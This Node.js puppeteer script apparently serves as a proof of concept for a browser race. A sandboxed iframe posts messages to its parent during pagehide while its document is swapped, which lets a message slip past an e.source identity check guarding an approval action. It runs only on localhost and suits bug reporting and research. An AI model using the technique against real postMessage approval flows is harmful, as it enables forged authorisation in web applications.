// Minimal reproduction of the sandbox-iframe identity race (pagehide post),
// with instrumentation printing the actual e.source value at delivery.
const http = require("node:http");
const puppeteer = require("puppeteer-core");
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const PORT = 9974;
const CSP = "sandbox allow-scripts; default-src 'none'; script-src 'nonce-tn'; " +
            "require-trusted-types-for 'script'; trusted-types 'none'; frame-ancestors 'self'";

const EXEC = "/Users/aserlili/.cache/puppeteer/chrome/mac_arm-146.0.7680.153/chrome-mac-arm64/Google Chrome for Testing.app/Contents/MacOS/Google Chrome for Testing";

http.createServer((req, res) => {
  const u = new URL(req.url, "http://x");

  if (u.pathname === "/host") {
    res.writeHead(200, { "Content-Type": "text/html" });
    res.end(`<!doctype html><body>REVIEW-复刻
      <iframe id="viewer" sandbox="allow-scripts" src="/sbx"></iframe>
      <script>
        const viewer = document.getElementById("viewer");
        let closing = false;
        let oldWin = null;
        addEventListener("message", (e) => {
          const eq = (e.source === viewer.contentWindow);
          const srcIsNull = (e.source === null);
          const srcIsSavedOld = (oldWin !== null && e.source === oldWin);
          const srcType = Object.prototype.toString.call(e.source);
          console.log("MSG: closing=" + closing + " eq=" + eq + " data=" + JSON.stringify(e.data));
          console.log("  [probe] e.source===null: " + srcIsNull + " | e.source===savedBeforeSwitch: " + srcIsSavedOld + " | toString: " + srcType + " | origin=" + e.origin);
          if (!closing || eq) return;
          console.log("!!!!!! PASSED FILTER !!!!!! → 此处即发批准请求");
        });
        viewer.addEventListener("load", () => {
          if (closing) return;
          closing = true;
          oldWin = viewer.contentWindow;               // snapshot before switch
          viewer.src = "/sbx?end";     // 触发文档切换
        });
      </scr` + `ipt></body>`);
    return;
  }

  if (u.pathname === "/sbx") {
    if (u.searchParams.has("end")) {
      setTimeout(() => {
        res.writeHead(200, { "Content-Type": "text/html", "Content-Security-Policy": CSP });
        res.end("<!doctype html>");
      }, 300);
      return;
    }
    res.writeHead(200, { "Content-Type": "text/html", "Content-Security-Policy": CSP });
    res.end(`<!doctype html><body><script nonce="tn">
      console.log("[S2] alive, origin=" + window.origin);
      addEventListener("pagehide", function () {
        console.log("[S2] pagehide! sending top.postMessage NOW");
        top.postMessage({ pagehideMsg: 1 }, "*");
        top.postMessage({ pagehideMsg: 2 }, "*");
      });
    </scr` + `ipt></body>`);
    return;
  }
  res.writeHead(404); res.end();
}).listen(PORT, async () => {
  const browser = await puppeteer.launch({ headless: true, executablePath: process.env.CHROME_PATH, args: ["--no-sandbox"] });
  console.log("Chrome version:", await browser.version());
  const p = await browser.newPage();
  p.on("console", (m) => console.log("[chrome]", m.text()));
  await p.goto(`http://localhost:${PORT}/host`, { waitUntil: "domcontentloaded" });
  await sleep(4000);
  await browser.close(); process.exit(0);
});
